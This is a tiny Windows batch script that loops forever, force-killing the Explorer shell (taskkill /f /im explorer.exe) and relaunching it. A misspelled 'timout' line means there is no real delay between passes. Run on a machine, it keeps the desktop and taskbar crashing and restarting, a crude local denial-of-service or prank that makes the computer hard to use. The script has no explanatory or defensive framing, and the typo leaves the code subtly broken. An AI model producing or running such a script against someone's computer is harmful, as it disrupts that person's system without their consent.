@echo off
:loop
taskkill /f /im explorer.exe
start C:\Windows\explorer.exe
timout /NOBREAK 0
goto loop
